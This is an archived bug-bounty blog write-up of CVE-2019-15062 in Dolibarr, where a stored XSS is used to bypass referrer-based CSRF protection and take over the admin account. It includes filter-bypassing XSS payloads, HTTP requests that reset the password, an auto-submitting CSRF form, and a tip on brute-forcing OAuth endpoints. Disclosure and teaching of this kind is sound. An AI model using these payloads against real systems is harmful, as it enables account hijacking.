---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-09-19_admin-hijacked-by-sea-surf-pirates.md
original_filename: 2019-09-19_admin-hijacked-by-sea-surf-pirates.md
title: Admin hijacked by Sea Surf Pirates
category: documents
detected_topics:
- xss
- csrf
- oauth
- command-injection
- api-security
tags:
- imported
- documents
- xss
- csrf
- oauth
- command-injection
- api-security
language: en
raw_sha256: 5bcec4b65734b0c670ec7834dd3fe2311fe85997e50a787e751c388201c1489b
text_sha256: 4e85e1effcf2eea1da91338f211de029305ed14aa9674deaa1bcd7a6ab167e08
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: true
---

# Admin hijacked by Sea Surf Pirates

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-09-19_admin-hijacked-by-sea-surf-pirates.md
- Source Type: markdown
- Detected Topics: xss, csrf, oauth, command-injection, api-security
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: True
- Raw SHA256: `5bcec4b65734b0c670ec7834dd3fe2311fe85997e50a787e751c388201c1489b`
- Text SHA256: `4e85e1effcf2eea1da91338f211de029305ed14aa9674deaa1bcd7a6ab167e08`


## Content

---
title: "Admin hijacked by Sea Surf Pirates"
page_title: "Admin hijacked by Sea Surf Pirates | I'm Gaurav Narwani"
url: "https://gauravnarwani.com/admin-hijacked-by-sea-surf-pirates/"
final_url: "https://gauravnarwani.com/admin-hijacked-by-sea-surf-pirates/"
authors: ["Gaurav Narwani (@gauravnarwani97)"]
programs: ["Dolibarr"]
bugs: ["Stored XSS", "CSRF", "Account takeover"]
publication_date: "2019-09-19"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5021
---

[ ![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/09/what-is-csrf.jpg?fit=733%2C345&ssl=1) ](https://gauravnarwani.com/admin-hijacked-by-sea-surf-pirates/)

# Admin hijacked by Sea Surf Pirates

[admin](https://gauravnarwani.com/author/admin/ "Posts by admin") / [September 19, 2019](https://gauravnarwani.com/admin-hijacked-by-sea-surf-pirates/)

In the following post, a Stored XSS vulnerability in the website was used to bypass CSRF protection to completely takeover Admin account. A Stored XSS itself is considered a High-Risk Vulnerability but the key policy to show maximum impact is by escalating the issue where it is extremely harmful to the organization. In the below case scenario, there were various protection mechanisms for preventing CSRF, but a simple Cross-Site Scripting could takeover any user on the website. If you are new to Cross-Site Scripting, read this [blog](https://gauravnarwani.com/a-tale-of-3-xss/). Below this, I’ll explain what is a Cross-Site Request Forgery after which will be a detailed explanation of the Case Study. The vulnerability is described in the below case study after which there is a **Bug Bounty Tip**. These tips are generally picked from Twitter by the **#bugbountytip** in search. Any interesting tip found would surely be added on the blogs. Please don’t forget to read the Bug Bounty Tip at the end of each post and like, share and subscribe to the Blog.

### Cross-Site Request Forgery

Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data since the attacker has no way to see the response to the forged request. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker’s choosing. If the victim is a normal user, a successful CSRF attack can force the user to perform state-changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application.

### Case Study: Stored XSS -> CSRF -> Admin Account Takeover

The application **Dolibarr 11.0.0-alpha** under test was a three-tier web application – Presentation tier (Front-End/User Interface), Application Tier (Functional Logic) and Data-Tier (Databases). The application is a CRM application used for scheduling meetings, phone calls and sending Emails. The application had a feature for admins to add files or URL’s related specifically for users of the application

**First analysis** : With the admin account under consideration, the label textbox under Linked Files was tested for Cross-Site Scripting. It turns out, the application did **whitelist** certain tags which prevented our malicious payload from Executing.
  
  
  **Request1:** <svg/onload=alert(1)>
  **Response:**
  400 Error
  …
  Malicious payload was provided to the application
  …
  
  
  
  **Request 2:** <img src=x onerror=alert(1)>
  **Response:** (Same)
  400 Error
  …
  Malicious payload was provided to the application
  …
  

Many payloads were tested to find which would be accepted. Finally, a payload was crafted as follows:

**< object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoIlhTUyIpPg==>**

It was observed that the object tag was unfiltered by the application. Hence the payload **< svg/onload=alert(“XSS”)>** was base64 encoded as **PHN2Zy9vbmxvYWQ9YWxlcnQoIlhTUyIpPg==** and inserted int=side the object tag
  
  
  **Request:** <object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoIlhTUyIpPg==>
  **Response:**
  200 OK
  …
  <object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoIlhTUyIpPg==>
  …
  

And rendering it in the browser gave:

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/03/xss-popup.png?fit=322%2C204&ssl=1)

Here we had our XSS, now let’s see how CSRF comes into play.

**Second Analysis:**

The application was tested for CSRF Vulnerability. The **POST** request to **card.php** was used to change the details of the user. This request was such that it updated the **newer** values what was passed to it. These values included the first name, last name, and most importantly the password. The application had **no mechanisms** to validate the old password and would take the **new password** when sent in the POST request.

Thus, to take over any account, only a CSRF request was required and the attacker would successfully take over the account. **Here’s the catch**. The application had a CSRF prevention mechanism as such that the request was only made from the domain it was requested. The application had a referrer based CSRF protection mechanism. The application ignored any requests made except from the website.

After sending the CSRF request, here’s what the request and response looked like:
  
  
  **Request 1:**
  POST /card.php HTTP/1.1
  Host: website.com
  Referrer: <http://burp>
  …
  id=1&admin=1&update=Save&login=admin&lastname=asd&firstname=admin&password=***REDACTED***
  **Response:**
  403 Forbidden
  …
  Please check the request before sending to server
  …
  
  
  
  **Request 2:**
  POST /card.php HTTP/1.1
  Host: website.com
  Referrer: website.com
  …
  id=1&admin=1&update=Save&login=admin&lastname=asd&firstname=admin&password=***REDACTED***
  **Response:**
  200 OK
  …
  Details changed Successfully
  …
  

### Bringing it all together

Now if you have guessed, the Stored XSS will now be used to bypass the SOP and thus help to execute the CSRF.

A CSRF POC was made as follows:
  
  
  <html>
  <body onload="attack()">
  <script>
  function attack() {
  document.getElementById('hidden_form').submit();
  }
  </script>
  <form id="hidden_form" name="hidden_form" action="http://localhost/dolibarr/user/card.php" method="POST">
  <input type="text" name="action" value="update" /><br />
  <input type="text" name="id" value="1" /><br />
  <input type="text" name="admin" value="1" /><br />
  <input type="text" name="update" value="Save" /><br />
  <input type="text" name="login" value="admin" /><br />
  <input type="text" name="lastname" value="asd" /><br />
  <input type="text" name="firstname" value="hacked" /><br />
  <input type="text" name="password" value="admin000" /><br />
  </form>
  </body>
  </html>
  

Now an attacker would load this CSRF POC inside an iframe tag where the Stored XSS was found.

A new payload was generated: **< /td></tr><object data=data:text/html;base64,PGlmcmFtZSBzcmM9Imh0dHA6Ly9sb2NhbGhvc3QvZG9saWJhcnIvY3NyZi5odG1sIj48L2lmcmFtZT4=><tr><td>** in the Label.

The base64 data was an iframe with the csrf.html in the source.

Now when this iframe was loaded into the page, the auto submitting CSRF would successfully change the admin details and hence could takeover admin account.
  
  
  **Payload:** </td></tr><object data=data:text/html;base64,PGlmcmFtZSBzcmM9Imh0dHA6Ly9sb2NhbGhvc3QvZG9saWJhcnIvY3NyZi5odG1sIj48L2lmcmFtZT4=><tr><td>

Response:

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/09/4.png?fit=947%2C1024&ssl=1)

Iframe successfully inserted into the webpage

Now on opening the admin account details, its first name and last name value had changed to hacked and asd. This proved our Account takeover.

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/09/7.png?fit=1000%2C747&ssl=1)

Admin account details changed.

This confirmed that the application was vulnerable for an ATO via Stored CSRF.

This wasn’t just it.

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/09/3ayvxc.jpg?fit=671%2C372&ssl=1)

Ideally, an attacker wouldn’t straight have the permission to become an admin. He would ideally be a less privileged user. Thus, the payload had to be sent from the Linked Files of a lower privileged user. Turns out that the option for a lower privileged user to add a new link or a file is blocked. Only the administrator has the privileges to set the URL or File for a user.

On analyzing the source code via the Inspect Element feature in the browser, it was observed that the input tag which was taking the value, had an event name disabled=””. By removing this event the feature to add URL/file was now accessible to the user. Turns out that the application had only client-side validation and thus with this feature, we were successfully able to add our payload to the linked files.

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/09/2.png?fit=933%2C1024&ssl=1)

Disabled event inside the input tag.

![](https://i0.wp.com/gauravnarwani.com/wp-content/uploads/2019/09/3.png?fit=1000%2C979&ssl=1)

Feature activated after removing the disabled event inside input tag.

Now, when an admin would see the linked files of the user with the malicious iframe, the payload would execute and would completely take over the admin account.

The report was submitted to Dolibarr with appropriate measures. The bug has now been fixed and a CVE ID of [CVE-2019-15062](https://gauravnarwani.com/publications/cve-2019-15062/) is generated for this bug. To view the POC or the actual submission you can view the Github Issue [here](https://github.com/Dolibarr/dolibarr/issues/11671).

That’s all for this Blog. Hope you liked it.

**Key Learning:**

  1. Don’t give up if XSS payloads don’t work. Try to check various payloads or methods to bypass the fix. Many of the times even though filters are in place, they can be bypassed in creative ways. Look at this blog.
  2. Check the working of CSRF. Try to find ways to bypass the CSRF protection.
  3. Don’t stick only to reporting XSS. Try to see if you can escalate it further (Like in this case)

**#BugBountyTip:**

Try endpoint brute-forcing on the login page to discover hidden or legacy OAuth providers.  
/login/facebook  
/login/oauth/twitter  
/login/oauth/v2/yahoo

P.S.: Legacy or unimplemented OAuth flows often contain vulnerabilities that can lead to account takeover.

Thankyou [@intigriti](http://twitter.com/intigriti) and [@ngalongc](http://twitter.com/ngalongc) for this tip.

That’s all for today. Please subscribe to my [blog](https://gauravnarwani.com). Connect with me on [LinkedIn](https://www.linkedin.com/in/gauravnarwani97). If you liked this blog and wish to support it, please do [![Buy me a coffee](https://bmc-cdn.nyc3.digitaloceanspaces.com/BMC-button-images/BMC-btn-logo.svg)Buy me a coffee](https://www.buymeacoffee.com/7JOe3dMcv)

## Gaurav Narwani

### Share this:

  * [Twitter](https://gauravnarwani.com/admin-hijacked-by-sea-surf-pirates/?share=twitter "Click to share on Twitter")
  * [Facebook](https://gauravnarwani.com/admin-hijacked-by-sea-surf-pirates/?share=facebook "Click to share on Facebook")
  * [LinkedIn](https://gauravnarwani.com/admin-hijacked-by-sea-surf-pirates/?share=linkedin "Click to share on LinkedIn")
  * [WhatsApp](https://gauravnarwani.com/admin-hijacked-by-sea-surf-pirates/?share=jetpack-whatsapp "Click to share on WhatsApp")
  * [Telegram](https://gauravnarwani.com/admin-hijacked-by-sea-surf-pirates/?share=telegram "Click to share on Telegram")
  * [Print](https://gauravnarwani.com/admin-hijacked-by-sea-surf-pirates/#print "Click to print")
  * 

### Like this:

Like Loading...

Posted in: [Bug Bounty](https://gauravnarwani.com/category/bugb/)
